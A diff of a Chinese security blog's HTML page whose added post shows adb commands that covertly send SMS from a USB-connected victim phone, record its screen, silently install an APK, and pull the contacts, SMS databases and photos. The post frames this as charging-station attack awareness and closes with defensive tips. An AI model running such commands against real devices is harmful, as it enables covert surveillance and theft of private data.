@@ -6,14 +6,37 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://y00z.github.io">
-  <title>Archives: 2017 | Yooz的博客</title>
+  <title>adb指令渗透手机获取隐私信息 | Yooz的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Yooz的博客">
-<meta property="og:url" content="http://y00z.github.io/archives/2017/index.html">
+  <meta name="description" content="前言
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+
+
+正文
+前天的315晚会上，其中有部分为“手机充电桩窃取使用者信息”，其实攻击的原理并不高端，无非就是执行了adb恶意指令。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="adb指令渗透手机获取隐私信息">
+<meta property="og:url" content="http://y00z.github.io/2017/03/17/adb指令渗透手机获取隐私信息/index.html">
 <meta property="og:site_name" content="Yooz的博客">
+<meta property="og:description" content="前言
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+
+
+正文
+前天的315晚会上，其中有部分为“手机充电桩窃取使用者信息”，其实攻击的原理并不高端，无非就是执行了adb恶意指令。">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-45.jpg">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-46.jpg">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-47.jpg">
+<meta property="og:updated_time" content="2017-03-21T02:16:22.788Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Yooz的博客">
+<meta name="twitter:title" content="adb指令渗透手机获取隐私信息">
+<meta name="twitter:description" content="前言
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+
+
+正文
+前天的315晚会上，其中有部分为“手机充电桩窃取使用者信息”，其实攻击的原理并不高端，无非就是执行了adb恶意指令。">
+<meta name="twitter:image" content="http://y00z.github.io/images/pasted-45.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Yooz的博客" type="application/atom+xml">
   
@@ -135,36 +158,107 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-adb指令渗透手机获取隐私信息" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      adb指令渗透手机获取隐私信息
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/03/17/adb指令渗透手机获取隐私信息/" class="archive-article-date">
+
+        <a href="/2017/03/17/adb指令渗透手机获取隐私信息/" class="archive-article-date">
   	<time datetime="2017-03-17T03:00:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-17</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/03/17/adb指令渗透手机获取隐私信息/">adb指令渗透手机获取隐私信息</a>
-    </h1>
-  
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
+<font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>
 
-        <div class="article-info info-on-right">
-          
+</blockquote>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><blockquote>
+<p>前天的315晚会上，其中有部分为“手机充电桩窃取使用者信息”，其实攻击的原理并不高端，无非就是执行了adb恶意指令。<a id="more"></a><br>前提就是必须开了usb调试模式，一旦开启并允许adb调试的话，就等同于让你的手机权限拱手让人了。</p>
+</blockquote>
+<h4 id="发送短信"><a href="#发送短信" class="headerlink" title="发送短信"></a>发送短信</h4><blockquote>
+<p>控制受害者手机发送短信，这个只需要三条命令就可以达到。<br><br> 打开了短信应用程序，当前焦点在文本框</p>
+<ul>
+<li>adb shell am start -a android.intent.action.SENDTO -d sms:10086 –es sms_body “hello” –ez exit_on_sent true<br>焦点去到发送按键</li>
+<li>adb shell input keyevent 22<br>回车，就是按下发送键</li>
+<li>adb shell input keyevent 66  </li>
+</ul>
+<p><img src="/images/pasted-45.jpg" alt=""></p>
+</blockquote>
+<h4 id="监视受害者手机"><a href="#监视受害者手机" class="headerlink" title="监视受害者手机"></a>监视受害者手机</h4><blockquote>
+<p>对受害者手机屏幕录屏，然后从手机传输到电脑。<br></p>
+<ul>
+<li>adb shell screenrecord /sdcard/test.mp4<br>录制完毕后再从手机传输到电脑中</li>
+<li>adb pull /sdcard/test.mp4 d:\test.mp4<br>其中如果全分辨率录制的会视频会比较大，如果受害者手机是2k的，那么就更大了，所以建议设置一下分辨率。</li>
+<li>adb shell screenrecord –size 848x480 /sdcard/test.mp4</li>
+</ul>
+<p><img src="/images/pasted-46.jpg" alt=""></p>
+</blockquote>
+<h4 id="静默安装程序"><a href="#静默安装程序" class="headerlink" title="静默安装程序"></a>静默安装程序</h4><blockquote>
+<p>将恶意程序静默安装在受害者手机内。</p>
+<ul>
+<li>adb install d:/test.apk<br>打开启动程序</li>
+<li>adb shell am start -n hk.myapplication/hk.myapplication.MainActivity<br>hk.myapplication为包名，hk.myapplication.MainActivity为Activity的路径.</li>
+</ul>
+<p><img src="/images/pasted-47.jpg" alt=""></p>
+</blockquote>
+<h4 id="窃取通讯录短信等隐私。"><a href="#窃取通讯录短信等隐私。" class="headerlink" title="窃取通讯录短信等隐私。"></a>窃取通讯录短信等隐私。</h4><blockquote>
+<p>作为安卓开发者我们都知道手机的短信通讯录等都存在手机的数据库中。<br>我们把数据库拷贝到电脑就相当于获取到了受害者的通讯录短信。<br>通讯录和通话记录的数据库存放在<br><code>/data/data/com.android.providers.contacts/databases/contacts2.db</code><br>短信的数据库存放在<br><code>/data/data/com.android.providers.telephony/databases/mmssms.db</code><br>ps: 不知道是我手机原因还是什么原因，adb pull 不能直接拷贝到电脑，然后adb shell进入命令模式，先把数据库拷贝到sdcard中，然后再adb pull就成功拷贝了。<br>另外所有安卓手机中，我们手机拍摄的照片都会保存在<code>/sdcard/DCIM</code>这个文件夹中，我们adb pull这个文件夹，受害者在生活照所拍摄的照片和视频全部都可以获取到。</p>
+</blockquote>
+<h4 id="末尾"><a href="#末尾" class="headerlink" title="末尾"></a>末尾</h4><blockquote>
+<p>这些危害都是在受害者连接usb后触发的，而且攻击过程受害者是完全感觉不到的。希望大家务必做好防范措施</p>
+<ul>
+<li>不要使用安全性未知的数据线连接自己的手机。</li>
+<li>在非需要调试的情况下，不要开启adb调试。</li>
+<li>安装可靠的手机杀毒软件。</li>
+</ul>
+</blockquote>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>向大佬低头<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://oi6ni1o6u.bkt.clouddn.com/zhifubao1.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://oi6ni1o6u.bkt.clouddn.com/weixin1.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
 		<ul class="article-tag-list">
@@ -180,305 +274,104 @@
 		</ul>
 	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/03/14/某教务系统注入getshell提权一条龙-下/" class="archive-article-date">
-  	<time datetime="2017-03-14T03:14:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/03/14/某教务系统注入getshell提权一条龙-下/">某教务系统注入getshell提权一条龙(下)</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color5">安全攻防</a>
-        </li>
       
-		</ul>
-	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/03/14/某教务系统注入getshell提权一条龙-上/" class="archive-article-date">
-  	<time datetime="2017-03-14T03:14:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/03/14/某教务系统注入getshell提权一条龙-上/">某教务系统注入getshell提权一条龙(上)</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color5">安全攻防</a>
-        </li>
       
-		</ul>
-	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/03/07/s2-045任意命令执行exp/" class="archive-article-date">
-  	<time datetime="2017-03-07T08:19:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/03/07/s2-045任意命令执行exp/">s2-045任意命令执行exp</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color5">安全攻防</a>
-        </li>
       
-		</ul>
-	</div>
-
-          
-
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
   </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/02/23/React-Native电商项目源码/" class="archive-article-date">
-  	<time datetime="2017-02-23T05:57:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/02/23/React-Native电商项目源码/">React-Native电商项目源码</a>
-    </h1>
-  
+</div>
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color3">React-Native</a>
-        </li>
-       
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color3">开源</a>
-        </li>
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://y00z.github.io/2017/03/17/adb指令渗透手机获取隐私信息/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/02/06/微信小程序app源码/" class="archive-article-date">
-  	<time datetime="2017-02-06T02:16:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/02/06/微信小程序app源码/">微信小程序app源码</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color3">开源</a>
-        </li>
-       
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color4">小程序</a>
-        </li>
-      
-		</ul>
-	</div>
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2017/03/14/某教务系统注入getshell提权一条龙-下/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">某教务系统注入getshell提权一条龙(下)</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/02/04/drozer对app安全测试/" class="archive-article-date">
-  	<time datetime="2017-02-04T03:44:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/02/04/drozer对app安全测试/">drozer对app安全测试</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color5">安全攻防</a>
-        </li>
-       
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color3">安卓</a>
-        </li>
-      
-		</ul>
-	</div>
 
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/01/08/对安卓锁机恶意程序反编译分析/" class="archive-article-date">
-  	<time datetime="2017-01-08T06:08:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/01/08/对安卓锁机恶意程序反编译分析/">对安卓锁机恶意程序反编译分析</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color3">安卓</a>
-        </li>
-       
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color4">反编译</a>
-        </li>
-      
-		</ul>
-	</div>
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="adb指令渗透手机获取隐私信息" data-title="adb指令渗透手机获取隐私信息" data-url="http://y00z.github.io/2017/03/17/adb指令渗透手机获取隐私信息/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"true"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
 
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
 
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/2017/page/2/">2</a><a class="extend next" rel="next" href="/archives/2017/page/2/">Next &raquo;</a>
-    </nav>
-  
 
 
           </div>
@@ -501,8 +394,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
